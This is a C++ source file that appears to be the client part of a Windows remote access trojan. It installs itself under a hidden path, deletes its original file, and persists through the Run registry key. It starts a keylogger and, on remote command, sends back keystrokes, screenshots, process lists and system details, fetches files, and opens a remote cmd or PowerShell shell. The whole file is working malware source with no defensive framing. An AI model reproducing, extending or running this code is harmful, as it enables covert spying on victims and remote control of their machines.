#include "general.h"
#include "iBase64.h"
#include <process.h>
#include <process.h>
#include <TlHelp32.h>
#include <vector>

#pragma warning(disable : 4996)

std::string General::currentPath;	//current path of executable
std::string General::installFolder; //path of folder it should be installed to
std::string General::installPath;	//full path where executable should be installed to
bool General::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
									//instead of proceeding to the main loop)
LPTSTR General::lpArguments;

static void SplitString(const std::string &str, std::vector<std::string> &vec, const std::string &c)
{
	std::string::size_type pos1, pos2;

	pos2 = str.find(c);
	pos1 = 0;
	while (std::string::npos != pos2)
	{
		vec.push_back(str.substr(pos1, pos2 - pos1));
		pos1 = pos2 + c.size();
		pos2 = str.find(c, pos1);
	}

	if (pos1 != str.length())
	{
		vec.push_back(str.substr(pos1));
	}
}

static unsigned RegGetSZ(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPSTR lpBuf, DWORD cchBuf)
{
	DWORD dwBytes = cchBuf * sizeof(WCHAR), dwType = 0;

	/* If SubKey is specified open it */
	if (lpSubKey && RegOpenKeyExA(hKey, lpSubKey, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
	{
		return 0;
	}

	/* Query registry value and check its type */
	memset(lpBuf, 0x00, cchBuf);
	if (RegQueryValueExA(hKey, lpValueName, NULL, &dwType, (LPBYTE)lpBuf, &dwBytes) != ERROR_SUCCESS || (dwType != REG_SZ && dwType != REG_MULTI_SZ))
	{
		dwBytes = 0;
		strcpy(lpBuf, "N/A");
		dwBytes = 6;
	}

	if (lpSubKey)
	{
		RegCloseKey(hKey);
	}

	return 1;
}

static VOID FormatDateTime(time_t Time, LPSTR lpBuf)
{
	unsigned i;
	SYSTEMTIME SysTime;
	const struct tm *lpTm;

	lpTm = localtime(&Time);
	SysTime.wYear = (WORD)(1900 + lpTm->tm_year);
	SysTime.wMonth = (WORD)(1 + lpTm->tm_mon);
	SysTime.wDayOfWeek = (WORD)lpTm->tm_wday;
	SysTime.wDay = (WORD)lpTm->tm_mday;
	SysTime.wHour = (WORD)lpTm->tm_hour;
	SysTime.wMinute = (WORD)lpTm->tm_min;
	SysTime.wSecond = (WORD)lpTm->tm_sec;
	SysTime.wMilliseconds = 0;

	/* Copy date first */
	i = GetDateFormatA(LOCALE_SYSTEM_DEFAULT, 0, &SysTime, NULL, lpBuf, 1024 - 2);
	if (i)
	{
		--i;
	}

	i += sprintf(lpBuf + i, "%s", ", ");
	GetTimeFormatA(LOCALE_SYSTEM_DEFAULT, 0, &SysTime, NULL, lpBuf + i, 1024 - i);
}

static BOOL RegGetDWORD(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPDWORD lpData)
{
	DWORD dwBytes = sizeof(*lpData), dwType;
	BOOL bRet = TRUE;

	/* If SubKey is specified open it */
	if (lpSubKey && RegOpenKeyExA(hKey, lpSubKey, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	/* Query registry value and check its type */
	if (RegQueryValueExA(hKey, lpValueName, NULL, &dwType, (LPBYTE)lpData, &dwBytes) != ERROR_SUCCESS || dwType != REG_DWORD)
	{
		*lpData = 0;
		bRet = FALSE;
	}

	if (lpSubKey)
	{
		RegCloseKey(hKey);
	}

	return bRet;
}

void AllSysInfo(std::string &strSysInfo)
{
	CHAR Buf[1024] = {0x00};
	CHAR szComputerName[1024] = {0x00};
	SYSTEM_INFO SysInfo;
	DWORD dwRetLength, dwTimestamp;
	HKEY hKey;
	OSVERSIONINFOA VersionInfo;

	GetSystemInfo(&SysInfo);
	strSysInfo += "ProcessorArchitecture : ";
	switch (SysInfo.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_INTEL:
		strSysInfo += "X86-based PC";
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		strSysInfo += "IA64-based PC";
		break;
	case PROCESSOR_ARCHITECTURE_AMD64:
		strSysInfo += "AMD64-based PC";
		break;
	default:
		strSysInfo += "Unknown";
		break;
	}
	strSysInfo += "\r\n";

	GetComputerNameA(szComputerName, &dwRetLength);
	strSysInfo += "ComputerName : ";
	strSysInfo += szComputerName;
	strSysInfo += "\r\n";

	memset(&VersionInfo, 0x00, sizeof(VersionInfo));
	VersionInfo.dwOSVersionInfoSize = sizeof(VersionInfo);
	GetVersionExA(&VersionInfo);
	strSysInfo += "MajorNumber: ";
	strSysInfo += std::to_string(VersionInfo.dwMajorVersion);
	strSysInfo += "\r\n";
	strSysInfo += "MinorVersion: ";
	strSysInfo += std::to_string(VersionInfo.dwMinorVersion);
	strSysInfo += "\r\n";
	strSysInfo += "BuildNumber: ";
	strSysInfo += std::to_string(VersionInfo.dwBuildNumber);
	strSysInfo += "\r\n";

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
	{
		return;
	}

	RegGetSZ(hKey, NULL, "ProductName", Buf, 1024);
	strSysInfo += "ProduceName : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetSZ(hKey, NULL, "CurrentType", Buf, 1024);
	strSysInfo += "ProduceName : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetSZ(hKey, NULL, "RegisteredOwner", Buf, 1024);
	strSysInfo += "RegisteredOwner : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetSZ(hKey, NULL, "RegisteredOrganization", Buf, 1024);
	strSysInfo += "RegisteredOrganization : ";
	strSysInfo += Buf;

	RegGetSZ(hKey, NULL, "ProductId", Buf, 1024);
	strSysInfo += "ProductId : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetDWORD(hKey, NULL, "InstallDate", &dwTimestamp);
	FormatDateTime((time_t)dwTimestamp, Buf);
	strSysInfo += "InstallDate : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";
	RegCloseKey(hKey);

	RegGetSZ(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion", Buf, 1024);
	strSysInfo += "SystemBiosVersion : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetSZ(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", "SystemBiosDate", Buf, 1024);
	strSysInfo += "SystemBiosDate : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";

	RegGetSZ(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", "SystemPartition", Buf, 1024);
	strSysInfo += "SystemPartition : ";
	strSysInfo += Buf;
	strSysInfo += "\r\n";
}

int SaveBitmapToBuffer(HBITMAP hBitmap, std::string &strScreenshotBuffer)
{
	HDC hDC;
	int iBits;
	WORD wBitCount;
	DWORD dwPaletteSize = 0;
	DWORD dwBmBitsSize;
	DWORD dwDIBSize;
	BITMAP Bitmap;
	BITMAPFILEHEADER bmfHdr;
	BITMAPINFOHEADER bi;
	LPBITMAPINFOHEADER lpbi;
	HANDLE hDib;
	HANDLE hPal;
	HANDLE hOldPal = NULL;

	int iScreenshotEncodeBufSize;
	int iScreenshotDecodeBufSize;
	BYTE *pScreenshotEncodeBuf = NULL;
	BYTE *pScreenshotDecodeBuf = NULL;
	CBASE64 Base64;

	hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
	DeleteDC(hDC);

	wBitCount = 8;
	if (wBitCount <= 8)
	{
		dwPaletteSize = (1 << wBitCount) * sizeof(RGBQUAD);
	}

	GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&Bitmap);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = Bitmap.bmWidth;
	bi.biHeight = Bitmap.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = wBitCount;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	dwBmBitsSize = ((Bitmap.bmWidth * wBitCount + 31) / 32) * 4 * Bitmap.bmHeight;

	hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
	lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	if (lpbi == NULL)
	{
		return 0;
	}

	*lpbi = bi;
	hPal = GetStockObject(DEFAULT_PALETTE);
	if (hPal)
	{
		hDC = GetDC(NULL);
		hOldPal = ::SelectPalette(hDC, (HPALETTE)hPal, FALSE);
		RealizePalette(hDC);
	}

	GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize, (LPBITMAPINFO)lpbi, DIB_RGB_COLORS);
	if (hOldPal)
	{
		SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
		RealizePalette(hDC);
		ReleaseDC(NULL, hDC);
	}

	bmfHdr.bfType = 0x4D42; // "BM"
	dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	iScreenshotDecodeBufSize = sizeof(BITMAPFILEHEADER) + dwDIBSize;
	pScreenshotDecodeBuf = new BYTE[iScreenshotDecodeBufSize];
	memset(pScreenshotDecodeBuf, 0x00, iScreenshotDecodeBufSize);

	iScreenshotEncodeBufSize = iScreenshotDecodeBufSize / 3 * 5;
	pScreenshotEncodeBuf = new BYTE[iScreenshotEncodeBufSize];
	memset(pScreenshotEncodeBuf, 0x00, iScreenshotEncodeBufSize);

	memcpy(pScreenshotDecodeBuf, &bmfHdr, sizeof(BITMAPFILEHEADER));
	memcpy(pScreenshotDecodeBuf + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
	Base64.Base64Encode(pScreenshotDecodeBuf, iScreenshotDecodeBufSize, pScreenshotEncodeBuf, iScreenshotEncodeBufSize);
	strScreenshotBuffer = (const char *)pScreenshotEncodeBuf;

	GlobalUnlock(hDib);
	GlobalFree(hDib);
	delete[] pScreenshotEncodeBuf;
	delete[] pScreenshotDecodeBuf;

	return 1;
}

HBITMAP GetCaptureBmp()
{
	HDC hDC;
	HDC MemDC;
	BYTE *Data;
	HBITMAP hBmp;
	BITMAPINFO bi;

	memset(&bi, 0, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bi.bmiHeader.biWidth = GetSystemMetrics(SM_CXSCREEN);
	bi.bmiHeader.biHeight = GetSystemMetrics(SM_CYSCREEN);
	bi.bmiHeader.biPlanes = 1;
	bi.bmiHeader.biBitCount = 8;

	hDC = GetDC(NULL);
	MemDC = CreateCompatibleDC(hDC);
	hBmp = CreateDIBSection(MemDC, &bi, DIB_RGB_COLORS, (void **)&Data, NULL, 0);
	SelectObject(MemDC, hBmp);
	BitBlt(MemDC, 0, 0, bi.bmiHeader.biWidth, bi.bmiHeader.biHeight, hDC, 0, 0, SRCCOPY);
	ReleaseDC(NULL, hDC);
	DeleteDC(MemDC);
	return hBmp;
}

static void GetSnapShot(std::string &result)
{
	PROCESSENTRY32 pe32;
	HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
	BOOL blMore = FALSE;

	memset(&pe32, 0x00, sizeof(PROCESSENTRY32));
	pe32.dwSize = sizeof(PROCESSENTRY32);

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		Client::clientptr->SendString("Take Snapshot fail", PacketType::Warning);
		return;
	}

	blMore = Process32First(hProcessSnap, &pe32);
	while (blMore)
	{
		result += pe32.szExeFile;
		result += "\r\n";
		blMore = Process32Next(hProcessSnap, &pe32);
	}

	CloseHandle(hProcessSnap);
}

bool General::init() //startup of program
{
	//VARIABLE SETUP
	currentPath = getCurrentPath();
	installFolder = getInstallFolder();
	installPath = getInstallPath(installFolder);

	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf) //checks if arguments are supplied (path of old file) and then melts given file (if any)
	{
		remove(lpArguments);
	}

	if (Settings::installSelf)
	{
		if (!locationSet()) //checks if it is at it's destined location (config in settings.h)
		{
			setLocation();
			installing = true;
		}
	}

	if (Settings::setStartupSelf) //checks if it should set itself into startup
	{
		if (!startupSet()) //checks if it's startup is set
		{
			setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installPath).c_str() : Conversion::convStringToWidestring(currentPath).c_str(), NULL);
		}
	}

	runInstalled(); //checks if this run of the instance is designated to the install process, then checks whether it should start the installed client

	if (Settings::logKeys)
	{
		std::thread Keylogger(Keylogger::startLogger);
		Keylogger.detach();
	}

	return installing;
}

bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
{
	DWORD dwType = 0;
	long lResult = 0;
	HKEY hKeyPlaceholder = NULL;

	lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

		if (lResult == ERROR_SUCCESS)
		{
			return true;
		}
		else
			return false;
	}
	else
		return false;
}

bool General::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	bool fSuccess; //TEMP CHANGE, OLD: BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE *)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

bool General::directoryExists(const char *dirName) //checks if directory exists
{
	DWORD attribs = ::GetFileAttributesA(dirName);
	if (attribs == INVALID_FILE_ATTRIBUTES)
		return false;
	return true; //original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
}

std::string General::getInstallFolder() //gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
{
	std::string rest = "";
	if (!(Settings::folderName == ""))
		rest = "\\" + Settings::folderName;

	std::string concat;
	char *buf = 0;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
		if (buf != NULL)
		{

			concat = std::string(buf) + rest; //concatenates string
			free(buf);
		}
	return concat;
}

std::string General::getInstallPath(std::string instFolder) //gets installpath (environment folder + folder name (if supplied) + file name)
{
	std::string concat;
	concat = instFolder + "\\" + Settings::fileName;

	return concat;
}

std::string General::getCurrentPath() //gets current path of executable
{
	char buf[MAX_PATH];
	GetModuleFileName(0, buf, MAX_PATH);
	return std::string(buf);
}

bool General::locationSet() //checks if executable is located in install position
{
	if (General::currentPath == General::installPath)
		return true;
	else
		return false;
}

bool General::startupSet() //checks if executable is starting on boot
{
	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
		return true;
	else
		return false;
}

bool General::installed() //checks if executable is installed properly (location + startup)
{
	if (startupSet() && locationSet())
		return true;
	else
		return false;
}

std::string General::currentDateTime()
{
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	localtime_s(&tstruct, &now);
	strftime(buf, sizeof(buf), "%d/%m/%Y [%X]", &tstruct);

	return buf;
}

void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments) //starts a process
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// start the program up
	CreateProcess(lpApplicationName, // the path
				  lpArguments,		 // Command line
				  NULL,				 // Process handle not inheritable
				  NULL,				 // Thread handle not inheritable
				  FALSE,			 // Set handle inheritance to FALSE
				  0,				 // No creation flags
				  NULL,				 // Use parent's environment block
				  NULL,				 // Use parent's starting directory
				  &si,				 // Pointer to STARTUPINFO structure
				  &pi);				 // Pointer to PROCESS_INFORMATION structure
									 // Close process and thread handles.
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void General::handleError(int errType, bool errSevere) //handles errors
{
	if (errSevere)
	{
		restartSelf();
	}
	else
	{
		switch (errType)
		{
		case 1: //general error
			Client::clientptr->SendString("General error", PacketType::Warning);
			return;
		case 2: //cmd error
			Client::clientptr->SendString("CMD error", PacketType::Warning);
			return;
		case 3: //networking error
			Client::clientptr->SendString("Networking error", PacketType::Warning);
			return;
		}
	}
}

bool General::processParameter(std::string &command, std::string compCommand)
{
	std::string::size_type i = command.find(compCommand);
	if (i != std::string::npos)
	{
		command.erase(i, compCommand.length() + 1);
		return true;
	}
	else
		return false;
}

std::string General::processCommand(std::string command)
{
	if (command == "kill")
	{
		killSelf();
		return "killing self";
	}
	else if (command == "restart")
	{
		restartSelf();
		return "restarting";
	}
	else if (command == "keydump")
	{

		return Keylogger::dumpKeys();
	}
	else if (command == "snapshot")
	{
		takeSnapshot();
		return "taking snapshot";
	}
	else if (command == "screenshot")
	{
		takeScreenshot();
		return "taking screenshot";
	}
	else if (command == "systeminfo")
	{
		getSystemInfo();
		return "systeminfo";
	}
	else if (processParameter(command, "sendfile"))
	{
		std::vector<std::string> vec;
		SplitString(command, vec, " ");
		if (vec.size() >= 2)
		{
			Client::clientptr->RequestFile(vec[0], vec[1]);
		}
		return "sendFile";
	}
	else if (processParameter(command, "remoteControl"))
	{
		if (!CMD::cmdOpen)
		{
			if (command == "cmd")
				command = "C:\\WINDOWS\\system32\\cmd.exe";
			else if (command == "pws")
				command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
			else if (command == "pws32")
				command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

			if (Utility::fileExists(command))
			{
				char *buffer = new char[command.length() + 3];
				buffer[command.length()] = '\0';
				strcpy_s(buffer, command.length() + 2, command.c_str());

				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
				while (!CMD::cmdOpen)
				{
					Sleep(50);
				}
				delete[] buffer;
				return "CMD session opened.";
			}
			else
				return "File doesn't exist.";
		}
		else
		{
			CMD::cmdptr->writeCMD("exit");
			CMD::cmdOpen = false;
			return "CMD session closed";
		}
	}
	else
	{
		return "Command '" + command + "' was not recognized.";
	}
}

void General::restartSelf()
{
	Client::clientptr->SendString("Restart requested: Restarting self", PacketType::Warning);
	startProcess(currentPath.c_str(), NULL);
	exit(0);
}

void General::killSelf()
{
	Client::clientptr->SendString("Termination requested: Killing self", PacketType::Warning);
	Client::clientptr->CloseConnection();
	exit(0);
}

void General::log(std::string message)
{
	if (Settings::logEvents)
	{
		std::ofstream logFile;
		logFile.open(installFolder + "\\" + Settings::logFileName, std::ios_base::app);
		logFile << currentDateTime() << ": " << message << std::endl;
		logFile.close();
	}
}

void General::setLocation() //sets location(copies file)
{
	if (!General::directoryExists(General::installFolder.c_str()))
		if (!CreateDirectory(General::installFolder.c_str(), NULL)) //tries to create folder
		{
			//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
		}
	CopyFile(General::currentPath.c_str(), General::installPath.c_str(), 0);
}

void General::runInstalled() //checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
	if (General::installing)
		if (!Settings::startOnNextBoot)
		{
			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + General::currentPath) : NULL); //REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
		}
}

void General::takeSnapshot()
{
	std::string result;

	GetSnapShot(result);
	Client::clientptr->SendString(result.c_str(), PacketType::ProcessInfo);

	return;
}

void General::takeScreenshot()
{
	HBITMAP hBmp;
	std::string result;

	hBmp = GetCaptureBmp();
	SaveBitmapToBuffer(hBmp, result);

	Client::clientptr->SendString(result.c_str(), PacketType::ScreenShot);
}

void General::getSystemInfo()
{
	std::string result;

	AllSysInfo(result);
	Client::clientptr->SendString(result.c_str(), PacketType::SystemInfo);
}
